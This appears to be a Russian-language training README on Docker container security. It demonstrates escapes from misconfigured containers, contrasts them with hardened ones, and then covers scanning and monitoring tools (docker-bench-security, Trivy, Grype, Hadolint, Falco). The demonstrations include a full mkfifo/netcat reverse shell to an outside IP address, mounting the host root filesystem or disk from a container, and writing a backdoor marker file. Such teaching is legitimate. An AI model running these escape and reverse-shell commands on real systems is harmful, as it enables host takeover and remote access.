# Урок 1

Устанавливаем docker и docker-compose (если еще не установлены)

```
apt-get update && apt-get install docker.io && apt-get install docker-compose
apt-get install git
```
Клонируем репозиторий:


Запускаем "плохой контейнер":
```
cd bad_container
docker-compose up -d 
```

Запускаем контейнер "внутри контейнера":
```
docker run -v /:/host --rm -it ubuntu chroot /host bash
```

Реверс шелл:
```
nc -lvnp 4444
```

```
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 213.148.10.215 4444 > /tmp/f
```

Запускаем "хороший контейнер":
```
cd good_container
docker-compose up -d 
```

Запускаем контейнер "внутри" контейнера:
```
docker run -v /:/host --rm -it ubuntu chroot /host bash
```

Реверс шелл:
```
nc -lvnp 4444
```

```
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 213.148.10.215 4444 > /tmp/f
```

Запускаем "очень плохой контейнер"
```
cd very_bad_container
docker-compose up -d 
```

```
mkdir /host_root
mount /dev/sda1 /host_root
echo "Backdoor installed!" > /host_root/tmp/backdoor.txt
```

Запускаем "очень хороший контейнер"
```
cd very_good_container
docker-compose up -d 
```

Проверяем
```
touch /tmp/testfile
chown appuser:appuser /tmp/testfile

date --set "2025-01-01"
```

CAP_SYS_TIME - отсутствует поэтому время изменить не удалось

# Урок 2
```
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
sudo sh docker-bench-security.sh
```

# Урок 3 

Trivy
Проверка образов
```
docker run --rm aquasec/trivy image <имя_образа>
```
Проверка конфигурации
```
docker run --rm -v $(pwd):/project aquasec/trivy config /project/Dockerfile
```

Grype
```
docker run --rm anchore/grype <имя_образа>
```

Hadolint
```
docker run --rm -i hadolint/hadolint < Dockerfile
```

Lesson 4
Falco
```
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg

echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" | \
sudo tee -a /etc/apt/sources.list.d/falcosecurity.list

sudo apt-get install apt-transport-https

apt-get update -y

FALCO_FRONTEND=noninteractive apt-get install -y falco
```